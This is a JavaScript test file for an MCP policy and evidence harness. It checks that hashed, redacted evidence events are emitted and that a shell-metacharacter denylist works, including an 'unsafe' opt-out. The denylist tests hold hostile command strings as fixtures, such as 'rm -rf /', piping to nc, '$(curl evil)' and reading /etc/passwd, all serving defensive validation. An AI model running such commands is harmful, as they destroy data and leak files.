// Guards the MCP production-evidence emit path from PR3 of the audit series.
//
// Before the fix, `evaluateMcpCall` built a local `mcpArtifact` and discarded
// it: only the generic policy-decision event reached the bundle, so MCP-
// specific context (which server, which tool, content-hashed args) never
// became reviewable evidence. The fix routes the artifact through
// `EvidenceCompiler.emitMcpInteraction` and these tests pin that behaviour.
//
// They also pin the createMcpServer shell-injection denylist: until the
// OpenAI Agents SDK exposes an argv form, command/args validation is the
// only defence against meta-characters smuggled through fullCommand.

import { strict as assert } from "node:assert";
import { test } from "node:test";

import { EvidenceCompiler, hashArguments } from "../dist/evidence.js";
import { PolicyEngine } from "../dist/policy.js";
import {
  createMcpServer,
  evaluateMcpCall,
} from "../dist/mcp.js";

function buildPolicy(overrides = {}) {
  return new PolicyEngine({
    version: "1.0",
    name: "test-mcp-policy",
    tools: { allow: [], deny: [], require_approval: [] },
    mcp: {
      allow: ["safe_tool"],
      deny: ["forbidden_tool"],
      require_approval: ["write_file"],
      ...overrides,
    },
  });
}

function buildConfig({ tool, args }) {
  return {
    serverRef: "test-server",
    command: "echo",
    args: [],
    policy: buildPolicy(),
    evidence: new EvidenceCompiler("test-run-1", "test-git"),
  };
}

test("evaluateMcpCall emits BOTH a policy-decision and an mcp-interaction event", () => {
  const config = buildConfig({});
  evaluateMcpCall(config, "safe_tool", { path: "/tmp/x" });

  assert.equal(config.evidence.events.length, 2);
  assert.equal(config.evidence.events[0].type, "assay.harness.policy-decision");
  assert.equal(config.evidence.events[1].type, "assay.harness.mcp-interaction");
});

test("mcp-interaction event carries server_ref, tool_name, decision, timestamp", () => {
  const config = buildConfig({});
  const { evidenceEvent } = evaluateMcpCall(config, "safe_tool");

  assert.equal(evidenceEvent.type, "assay.harness.mcp-interaction");
  assert.equal(evidenceEvent.data.server_ref, "test-server");
  assert.equal(evidenceEvent.data.tool_name, "safe_tool");
  assert.equal(evidenceEvent.data.decision, "allow");
  assert.ok(
    typeof evidenceEvent.data.timestamp === "string" && evidenceEvent.data.timestamp.length > 0,
    "timestamp must be a non-empty string",
  );
});

test("arguments_hash is content-addressed and only present when args are provided", () => {
  const withArgsCfg = buildConfig({});
  const noArgsCfg = buildConfig({});

  const { evidenceEvent: withArgs } = evaluateMcpCall(
    withArgsCfg,
    "safe_tool",
    { path: "/tmp/x", flag: true },
  );
  const { evidenceEvent: noArgs } = evaluateMcpCall(noArgsCfg, "safe_tool");

  assert.equal(typeof withArgs.data.arguments_hash, "string");
  assert.equal(
    withArgs.data.arguments_hash,
    hashArguments({ path: "/tmp/x", flag: true }),
    "arguments_hash must match hashArguments output for identical inputs",
  );
  assert.equal(
    noArgs.data.arguments_hash,
    undefined,
    "arguments_hash must be absent when no args are provided",
  );
});

test("arguments_hash carries the raw arguments only as a content hash, not the values", () => {
  const config = buildConfig({});
  const sensitive = { api_key: "sk-secret-do-not-leak", path: "/etc/passwd" };

  const { evidenceEvent } = evaluateMcpCall(config, "safe_tool", sensitive);

  const serialized = JSON.stringify(evidenceEvent.data);
  assert.equal(
    serialized.includes("sk-secret-do-not-leak"),
    false,
    "raw api_key value must not appear in the emitted evidence event",
  );
  assert.equal(
    serialized.includes("/etc/passwd"),
    false,
    "raw path value must not appear in the emitted evidence event",
  );
  assert.ok(
    evidenceEvent.data.arguments_hash.startsWith("sha256:"),
    "arguments_hash must be a sha256: ref",
  );
});

test("require_approval decisions carry an approval_ref anchor", () => {
  const config = buildConfig({});
  const { policyResult, evidenceEvent } = evaluateMcpCall(config, "write_file", {
    path: "/tmp/x",
  });

  assert.equal(policyResult.decision, "require_approval");
  assert.equal(typeof evidenceEvent.data.approval_ref, "string");
  assert.ok(
    evidenceEvent.data.approval_ref.includes("write_file"),
    "approval_ref must reference the tool that required approval",
  );
});

test("deny decisions still emit the mcp-interaction event with decision='deny'", () => {
  const config = buildConfig({});
  const { policyResult, evidenceEvent } = evaluateMcpCall(config, "forbidden_tool");

  assert.equal(policyResult.decision, "deny");
  assert.equal(evidenceEvent.data.decision, "deny");
  assert.equal(evidenceEvent.type, "assay.harness.mcp-interaction");
});

test("call_id_ref is recorded when supplied", () => {
  const config = buildConfig({});
  const { evidenceEvent } = evaluateMcpCall(
    config,
    "safe_tool",
    { x: 1 },
    "call_abc123",
  );

  assert.equal(evidenceEvent.data.call_id_ref, "call_abc123");
});

test("createMcpServer rejects shell metacharacters in command", () => {
  assert.throws(
    () => createMcpServer({ name: "x", command: "echo; rm -rf /", args: [] }),
    /shell metacharacters/,
  );
  assert.throws(
    () => createMcpServer({ name: "x", command: "echo | nc evil", args: [] }),
    /shell metacharacters/,
  );
  assert.throws(
    () => createMcpServer({ name: "x", command: "$(curl evil)", args: [] }),
    /shell metacharacters/,
  );
});

test("createMcpServer rejects shell metacharacters in args", () => {
  assert.throws(
    () => createMcpServer({ name: "x", command: "echo", args: ["; rm -rf /"] }),
    /shell metacharacters/,
  );
  assert.throws(
    () => createMcpServer({ name: "x", command: "echo", args: ["hello", "`cat /etc/passwd`"] }),
    /shell metacharacters/,
  );
});

test("createMcpServer rejects empty or non-string command", () => {
  assert.throws(
    () => createMcpServer({ name: "x", command: "", args: [] }),
    /non-empty string/,
  );
});

// --- allowUnsafeFullCommand escape hatch ---
//
// The strict denylist rejects whitespace, which breaks legitimate paths
// such as "/Users/me/Application Support/...". The opt-out gives the
// caller a way to accept that risk explicitly. The option is named
// "allowUnsafeFullCommand" rather than "trustedCommand" so the risk is
// visible at the call site — code review sees the word "unsafe" in the
// option name, not a euphemism.

test("path with space is REJECTED by default (strict mode)", () => {
  // Whitespace is on the denylist for the default strict mode. This is
  // the safe default — even a legitimate path-with-space is refused
  // until the caller opts out explicitly.
  assert.throws(
    () => createMcpServer({
      name: "x",
      command: "/Users/me/Application Support/foo/bin",
      args: [],
    }),
    /shell metacharacters/,
  );
});

test("path with space is ACCEPTED with allowUnsafeFullCommand: true (caller-owned risk)", () => {
  // This test verifies that the escape hatch genuinely bypasses the
  // denylist. The path is legitimate (no actual injection); the caller
  // accepts responsibility for that determination.
  const server = createMcpServer({
    name: "x",
    command: "/Users/me/Application Support/foo/bin",
    args: ["--mode", "stdio"],
    allowUnsafeFullCommand: true,
  });
  assert.ok(server, "createMcpServer must return a server when opt-out is true");
});

test("allowUnsafeFullCommand: true ALSO bypasses the metachar denylist (caller-owned risk)", () => {
  // Documents the full extent of the opt-out: not just whitespace, but
  // every denylisted metacharacter. This is what makes the option
  // "unsafe" — the caller MUST have validated the input upstream.
  const server = createMcpServer({
    name: "x",
    // Contrived input that would explode under any normal validation;
    // the test name documents that this is caller-owned risk.
    command: "echo",
    args: ["a;b", "$(c)", "`d`"],
    allowUnsafeFullCommand: true,
  });
  assert.ok(server, "opt-out must bypass the entire denylist, not just whitespace");
});

test("allowUnsafeFullCommand: false behaves identically to omitted (strict default preserved)", () => {
  // Explicit false must equal omitted — no implicit truthy coercion of
  // the opt-out flag.
  assert.throws(
    () => createMcpServer({
      name: "x",
      command: "echo; rm -rf /",
      args: [],
      allowUnsafeFullCommand: false,
    }),
    /shell metacharacters/,
  );
});

test("allowUnsafeFullCommand: true still requires args to be an array", () => {
  // The args-shape check happens regardless of the opt-out flag, so
  // calling with `args: undefined` still throws — just with the
  // shape error rather than the metachar error.
  assert.throws(
    () => createMcpServer({
      name: "x",
      command: "echo",
      // @ts-expect-error: deliberately violating the type for the test
      args: undefined,
      allowUnsafeFullCommand: true,
    }),
    /args must be an array/,
  );
});
